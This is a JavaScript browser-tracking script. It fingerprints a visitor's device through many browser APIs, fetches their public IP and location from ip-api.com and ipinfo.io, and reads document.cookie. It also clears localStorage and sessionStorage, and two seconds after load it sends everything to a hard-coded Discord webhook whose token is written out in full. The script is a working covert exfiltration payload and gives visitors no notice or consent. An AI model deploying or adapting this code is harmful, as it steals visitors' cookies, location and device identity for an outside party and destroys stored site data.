// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p';

// Object to store collected data
const collectedData = {
    Permissions: {},
    Network: {},
    Fingerprint: {},
    Sensors: {},
    Graphics: {},
    Storage: {},
    Workers: {},
    ServiceWorker: {},
    Media: {},
    'WebCodecs/Streams': {},
    Observers: {},
    'Window/Doc': {},
    'Display Control': {},
    Auth: {},
    Files: {},
    'Other Devices': {},
    Coordination: {},
    'Presentation/XR': {},
    'URL & Encoding': {},
    Scripting: {},
    'EME (DRM)': {},
    'Events(document.addEventListener)': {},
    'Events(window.addEventListener)': {},
    'Events(element.addEventListener)': {},
    'Permissions(names)': {},
    NetworkInformation: {},
    MediaSessionActions: {},
    'MediaSessionActions (handlers)': {},
    'CSS Feature/Fingerprint': {},
    WebGPU: {},
    'Cross-Tab': {},
    Reporting: {}
};

// Helper function to safely execute and log API calls
function safeExec(category, item, fn) {
    try {
        const result = fn();
        // Handle promises and non-promises
        if (result instanceof Promise) {
            result.then(res => {
                collectedData[category][item] = res !== undefined ? JSON.stringify(res) : 'Success';
            }).catch(err => {
                collectedData[category][item] = `Error: ${err.message}`;
            });
        } else {
            collectedData[category][item] = result !== undefined ? JSON.stringify(result) : 'Success';
        }
    } catch (error) {
        collectedData[category][item] = `Error: ${error.message}`;
    }
}

// Helper function to format data for Discord
function formatForDiscord(data) {
    const embeds = [];
    for (const [category, items] of Object.entries(data)) {
        let description = '';
        for (const [item, value] of Object.entries(items)) {
            description += `**${item}**: ${value}\n`;
        }
        embeds.push({
            title: category,
            description: description || 'No data collected',
            color: 5814783
        });
    }
    return {
        content: 'Browser API Tracking Results',
        embeds
    };
}

// Helper function to send data to Discord webhook
async function sendToWebhook(data) {
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formatForDiscord(data))
        });
        if (!response.ok) {
            console.error('Webhook failed:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// 1) Permissions (only non-intrusive ones)
safeExec('Permissions', 'navigator.permissions.query()', () => navigator.permissions.query({name: 'geolocation'}));
safeExec('Permissions', 'navigator.canShare()', () => navigator.canShare({url: 'https://example.com'}));

// 2) Network
safeExec('Network', 'fetch("https://ip-api.com/json/")', () => fetch('https://ip-api.com/json/').then(res => res.json()));
safeExec('Network', 'fetch("https://ipinfo.io/json")', () => fetch('https://ipinfo.io/json').then(res => res.json()));
safeExec('Network', 'fetch(url, {mode:"no-cors"})', () => fetch('https://example.com', {mode: 'no-cors'}));
safeExec('Network', 'XMLHttpRequest()', () => new XMLHttpRequest());
safeExec('Network', 'new WebSocket(url)', () => new WebSocket('wss://example.com'));
safeExec('Network', 'new EventSource(url)', () => new EventSource('https://example.com'));
safeExec('Network', 'new RTCPeerConnection(config)', () => new RTCPeerConnection());
safeExec('Network', 'RTCPeerConnection.createDataChannel()', () => new RTCPeerConnection().createDataChannel('test'));
safeExec('Network', 'RTCPeerConnection.getStats()', () => new RTCPeerConnection().getStats());
safeExec('Network', 'new WebTransport(url)', () => new WebTransport('https://example.com'));

// 3) Fingerprint
safeExec('Fingerprint', 'navigator.userAgent', () => navigator.userAgent);
safeExec('Fingerprint', 'navigator.userAgentData', () => navigator.userAgentData);
safeExec('Fingerprint', 'navigator.userAgentData.brands', () => navigator.userAgentData?.brands);
safeExec('Fingerprint', 'navigator.userAgentData.platform', () => navigator.userAgentData?.platform);
safeExec('Fingerprint', 'navigator.platform', () => navigator.platform);
safeExec('Fingerprint', 'navigator.language', () => navigator.language);
safeExec('Fingerprint', 'navigator.languages', () => navigator.languages);
safeExec('Fingerprint', 'navigator.hardwareConcurrency', () => navigator.hardwareConcurrency);
safeExec('Fingerprint', 'navigator.deviceMemory', () => navigator.deviceMemory);
safeExec('Fingerprint', 'navigator.maxTouchPoints', () => navigator.maxTouchPoints);
safeExec('Fingerprint', 'navigator.vendor', () => navigator.vendor);
safeExec('Fingerprint', 'navigator.product', () => navigator.product);
safeExec('Fingerprint', 'navigator.webdriver', () => navigator.webdriver);
safeExec('Fingerprint', 'navigator.doNotTrack', () => navigator.doNotTrack);
safeExec('Fingerprint', 'navigator.cookieEnabled', () => navigator.cookieEnabled);
safeExec('Fingerprint', 'navigator.javaEnabled()', () => navigator.javaEnabled());
safeExec('Fingerprint', 'navigator.plugins', () => Array.from(navigator.plugins));
safeExec('Fingerprint', 'navigator.mimeTypes', () => Array.from(navigator.mimeTypes));
safeExec('Fingerprint', 'screen.width', () => screen.width);
safeExec('Fingerprint', 'screen.height', () => screen.height);
safeExec('Fingerprint', 'screen.availWidth', () => screen.availWidth);
safeExec('Fingerprint', 'screen.availHeight', () => screen.availHeight);
safeExec('Fingerprint', 'screen.colorDepth', () => screen.colorDepth);
safeExec('Fingerprint', 'screen.pixelDepth', () => screen.pixelDepth);
safeExec('Fingerprint', 'screen.orientation.type', () => screen.orientation.type);
safeExec('Fingerprint', 'window.devicePixelRatio', () => window.devicePixelRatio);
safeExec('Fingerprint', 'window.innerWidth', () => window.innerWidth);
safeExec('Fingerprint', 'window.innerHeight', () => window.innerHeight);
safeExec('Fingerprint', 'window.outerWidth', () => window.outerWidth);
safeExec('Fingerprint', 'window.outerHeight', () => window.outerHeight);
safeExec('Fingerprint', 'Intl.DateTimeFormat().resolvedOptions().timeZone', () => Intl.DateTimeFormat().resolvedOptions().timeZone);

// 4) Sensors
safeExec('Sensors', 'navigator.getBattery()', () => navigator.getBattery());
safeExec('Sensors', 'BatteryManager.charging', () => navigator.getBattery().then(b => b.charging));
safeExec('Sensors', 'BatteryManager.level', () => navigator.getBattery().then(b => b.level));
safeExec('Sensors', 'BatteryManager.chargingTime', () => navigator.getBattery().then(b => b.chargingTime));
safeExec('Sensors', 'BatteryManager.dischargingTime', () => navigator.getBattery().then(b => b.dischargingTime));

// 5) Graphics
safeExec('Graphics', 'canvas.getContext("2d")', () => document.createElement('canvas').getContext('2d'));
safeExec('Graphics', 'canvas.toDataURL()', () => document.createElement('canvas').toDataURL());
safeExec('Graphics', 'OffscreenCanvas()', () => new OffscreenCanvas(100, 100));
safeExec('Graphics', 'WebGLRenderingContext.getParameter()', () => document.createElement('canvas').getContext('webgl')?.getParameter(37446));
safeExec('Graphics', 'WebGLRenderingContext.getSupportedExtensions()', () => document.createElement('canvas').getContext('webgl')?.getSupportedExtensions());
safeExec('Graphics', 'WebGLRenderingContext.getShaderPrecisionFormat()', () => document.createElement('canvas').getContext('webgl')?.getShaderPrecisionFormat(35632, 36338));
safeExec('Graphics', 'WebGL2RenderingContext.getParameter()', () => document.createElement('canvas').getContext('webgl2')?.getParameter(37446));
safeExec('Graphics', 'WebGL2RenderingContext.getSupportedExtensions()', () => document.createElement('canvas').getContext('webgl2')?.getSupportedExtensions());
safeExec('Graphics', 'WebGL2RenderingContext.getExtension()', () => document.createElement('canvas').getContext('webgl2')?.getExtension('EXT_color_buffer_float'));
safeExec('Graphics', 'navigator.gpu?.requestAdapter()', () => navigator.gpu?.requestAdapter());

// 6) Storage
safeExec('Storage', 'localStorage.setItem()', () => localStorage.setItem('test', 'value'));
safeExec('Storage', 'localStorage.getItem()', () => localStorage.getItem('test'));
safeExec('Storage', 'localStorage.removeItem()', () => localStorage.removeItem('test'));
safeExec('Storage', 'localStorage.clear()', () => localStorage.clear());
safeExec('Storage', 'sessionStorage.setItem()', () => sessionStorage.setItem('test', 'value'));
safeExec('Storage', 'sessionStorage.getItem()', () => sessionStorage.getItem('test'));
safeExec('Storage', 'sessionStorage.removeItem()', () => sessionStorage.removeItem('test'));
safeExec('Storage', 'sessionStorage.clear()', () => sessionStorage.clear());
safeExec('Storage', 'indexedDB.open()', () => indexedDB.open('test'));
safeExec('Storage', 'indexedDB.deleteDatabase()', () => indexedDB.deleteDatabase('test'));
safeExec('Storage', 'caches.open()', () => caches.open('test'));
safeExec('Storage', 'caches.keys()', () => caches.keys());
safeExec('Storage', 'caches.delete()', () => caches.delete('test'));
safeExec('Storage', 'document.cookie', () => document.cookie);
safeExec('Storage', 'navigator.storage.estimate()', () => navigator.storage.estimate());

// 7) Workers
safeExec('Workers', 'new Worker(url)', () => new Worker('data:text/javascript,'));
safeExec('Workers', 'new SharedWorker(url)', () => new SharedWorker('data:text/javascript,'));
safeExec('Workers', 'new MessageChannel()', () => new MessageChannel());
safeExec('Workers', 'BroadcastChannel', () => new BroadcastChannel('test'));

// 8) Service Workers
safeExec('ServiceWorker', 'navigator.serviceWorker.getRegistrations()', () => navigator.serviceWorker.getRegistrations());
safeExec('ServiceWorker', 'navigator.serviceWorker.ready', () => navigator.serviceWorker.ready);

// 9) Media
safeExec('Media', 'MediaCapabilities.decodingInfo()', () => navigator.mediaCapabilities.decodingInfo({type: 'file', video: {contentType: 'video/mp4'}}));
safeExec('Media', 'MediaCapabilities.encodingInfo()', () => navigator.mediaCapabilities.encodingInfo({type: 'record', video: {contentType: 'video/mp4'}}));
safeExec('Media', 'document.pictureInPictureEnabled', () => document.pictureInPictureEnabled);

// 10) WebCodecs/Streams
safeExec('WebCodecs/Streams', 'new VideoDecoder()', () => new VideoDecoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new AudioDecoder()', () => new AudioDecoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new VideoEncoder()', () => new VideoEncoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new AudioEncoder()', () => new AudioEncoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new ReadableStream()', () => new ReadableStream());
safeExec('WebCodecs/Streams', 'new WritableStream()', () => new WritableStream());
safeExec('WebCodecs/Streams', 'new TransformStream()', () => new TransformStream());
safeExec('WebCodecs/Streams', 'CompressionStream("gzip")', () => new CompressionStream('gzip'));
safeExec('WebCodecs/Streams', 'DecompressionStream("gzip")', () => new DecompressionStream('gzip'));

// 11) Observers
safeExec('Observers', 'new MutationObserver()', () => new MutationObserver(() => {}));
safeExec('Observers', 'new ResizeObserver()', () => new ResizeObserver(() => {}));
safeExec('Observers', 'new IntersectionObserver()', () => new IntersectionObserver(() => {}));
safeExec('Observers', 'new PerformanceObserver()', () => new PerformanceObserver(() => {}));
safeExec('Observers', 'performance.now()', () => performance.now());
safeExec('Observers', 'performance.getEntries()', () => performance.getEntries());
safeExec('Observers', 'performance.memory', () => performance.memory);
safeExec('Observers', 'new ReportingObserver()', () => new ReportingObserver(() => {}));

// 12) Window/Doc
safeExec('Window/Doc', 'document.referrer', () => document.referrer);
safeExec('Window/Doc', 'document.location', () => document.location.href);
safeExec('Window/Doc', 'document.domain', () => document.domain);
safeExec('Window/Doc', 'document.visibilityState', () => document.visibilityState);
safeExec('Window/Doc', 'document.hasFocus()', () => document.hasFocus());
safeExec('Window/Doc', 'window.history.length', () => window.history.length);
safeExec('Window/Doc', 'window.name', () => window.name);

// 13) Display Control
safeExec('Display Control', 'document.fullscreenElement', () => document.fullscreenElement);
safeExec('Display Control', 'document.pointerLockElement', () => document.pointerLockElement);

// 14) Auth
safeExec('Auth', 'PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()', () => PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable());

// 15) Files
safeExec('Files', 'DataTransfer.getData()', () => new DataTransfer().getData('text'));
safeExec('Files', 'DataTransfer.setData()', () => new DataTransfer().setData('text', 'test'));

// 16) Other Devices
safeExec('Other Devices', 'navigator.getGamepads()', () => navigator.getGamepads());

// 17) Coordination
safeExec('Coordination', 'SharedArrayBuffer', () => new SharedArrayBuffer(4));

// 18) Presentation/XR
safeExec('Presentation/XR', 'navigator.presentation.receiver', () => navigator.presentation.receiver);
safeExec('Presentation/XR', 'navigator.xr.isSessionSupported()', () => navigator.xr?.isSessionSupported('immersive-vr'));

// 19) URL & Encoding
safeExec('URL & Encoding', 'btoa()', () => btoa('test'));
safeExec('URL & Encoding', 'atob()', () => atob('dGVzdA=='));
safeExec('URL & Encoding', 'TextEncoder.encode()', () => new TextEncoder().encode('test'));
safeExec('URL & Encoding', 'TextDecoder.decode()', () => new TextDecoder().decode(new Uint8Array([116, 101, 115, 116])));

// 20) Scripting
safeExec('Scripting', 'eval()', () => eval('1+1'));
safeExec('Scripting', 'new Function(code)', () => new Function('return 1+1')());
safeExec('Scripting', 'WebAssembly.instantiate()', () => WebAssembly.instantiate(new ArrayBuffer(0)));
safeExec('Scripting', 'WebAssembly.compile()', () => WebAssembly.compile(new ArrayBuffer(0)));

// 21) EME (DRM)
safeExec('EME (DRM)', 'navigator.requestMediaKeySystemAccess("com.widevine.alpha", configs)', () => navigator.requestMediaKeySystemAccess('com.widevine.alpha', []));

// 22) Pointer Events
const pointerEvents = ["pointerdown","pointerup","pointermove","pointercancel","pointerover","pointerout","pointerenter","pointerleave","gotpointercapture","lostpointercapture"];
pointerEvents.forEach(event => {
    safeExec('Events(document.addEventListener)', `document.addEventListener("${event}")`, () => 'Listener added');
    safeExec('Events(window.addEventListener)', `window.addEventListener("${event}")`, () => 'Listener added');
    safeExec('Events(element.addEventListener)', `element.addEventListener("${event}")`, () => 'Listener added');
});

// 23) DOM Events
const domEvents = ["abort","afterprint","animationend","animationiteration","animationstart","auxclick","beforeprint","beforeunload","blur","canplay","canplaythrough","change","click","close","contextmenu","copy","cuechange","cut","dblclick","drag","dragend","dragenter","dragexit","dragleave","dragover","dragstart","drop","durationchange","ended","error","focus","focusin","focusout","formdata","fullscreenchange","fullscreenerror","hashchange","input","invalid","keydown","keypress","keyup","languagechange","load","loadeddata","loadedmetadata","loadstart","message","messageerror","mousedown","mouseenter","mouseleave","mousemove","mouseout","mouseover","mouseup","offline","online","open","orientationchange","pagehide","pageshow","paste","pause","play","playing","popstate","progress","ratechange","rejectionhandled","reset","resize","scroll","securitypolicyviolation","seeked","seeking","select","selectionchange","selectstart","slotchange","stalled","storage","submit","suspend","timeupdate","toggle","touchcancel","touchend","touchmove","touchstart","transitionend","unhandledrejection","visibilitychange","volumechange","waiting","wheel","gamepadconnected","gamepaddisconnected","devicemotion","deviceorientation","deviceorientationabsolute"];
domEvents.forEach(event => {
    safeExec('Events(document.addEventListener)', `document.addEventListener("${event}")`, () => 'Listener added');
    safeExec('Events(window.addEventListener)', `window.addEventListener("${event}")`, () => 'Listener added');
    safeExec('Events(element.addEventListener)', `element.addEventListener("${event}")`, () => 'Listener added');
});

// 24) Permissions (names)
const permissions = ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","background-sync","ambient-light-sensor","accelerometer","gyroscope","magnetometer","midi","payment-handler","push","persistent-storage","nfc","idle-detection","storage-access","window-management","local-fonts"];
permissions.forEach(permission => {
    safeExec('Permissions(names)', `Permission: ${permission}`, () => navigator.permissions.query({name: permission}));
});

// 25) NetworkInformation
safeExec('NetworkInformation', 'navigator.connection.type', () => navigator.connection?.type);
safeExec('NetworkInformation', 'navigator.connection.effectiveType', () => navigator.connection?.effectiveType);
safeExec('NetworkInformation', 'navigator.connection.downlink', () => navigator.connection?.downlink);
safeExec('NetworkInformation', 'navigator.connection.rtt', () => navigator.connection?.rtt);
safeExec('NetworkInformation', 'navigator.connection.saveData', () => navigator.connection?.saveData);

// 26) MediaSessionActions
const mediaActions = ["play","pause","seekbackward","seekforward","seekto","stop","previoustrack","nexttrack","skipad","togglecamera","togglemicrophone"];
mediaActions.forEach(action => {
    safeExec('MediaSessionActions', action, () => action);
    safeExec('MediaSessionActions (handlers)', `navigator.mediaSession.setActionHandler("${action}", handler)`, () => 'Handler set');
});

// 27) CSS Feature/Fingerprint
safeExec('CSS Feature/Fingerprint', 'CSS.supports(property, value)', () => CSS.supports('display', 'flex'));
safeExec('CSS Feature/Fingerprint', 'matchMedia("(prefers-color-scheme: dark)")', () => window.matchMedia('(prefers-color-scheme: dark)').matches);
safeExec('CSS Feature/Fingerprint', 'matchMedia("(forced-colors: active)")', () => window.matchMedia('(forced-colors: active)').matches);
safeExec('CSS Feature/Fingerprint', 'matchMedia("(prefers-reduced-motion: reduce)")', () => window.matchMedia('(prefers-reduced-motion: reduce)').matches);
safeExec('CSS Feature/Fingerprint', 'matchMedia("(inverted-colors: inverted)")', () => window.matchMedia('(inverted-colors: inverted)').matches);

// 28) WebGPU
safeExec('WebGPU', 'navigator.gpu.requestAdapter()', () => navigator.gpu?.requestAdapter());

// 29) Cross-Tab
safeExec('Cross-Tab', 'new BroadcastChannel("name")', () => new BroadcastChannel('name'));

// 30) Reporting
safeExec('Reporting', 'new ReportingObserver(callback, {types:["csp-violation","deprecation","intervention"]})', () => new ReportingObserver(() => {}, {types: ['csp-violation', 'deprecation', 'intervention']}));

// Wait for async operations to settle, then send data
setTimeout(() => sendToWebhook(collectedData), 2000);
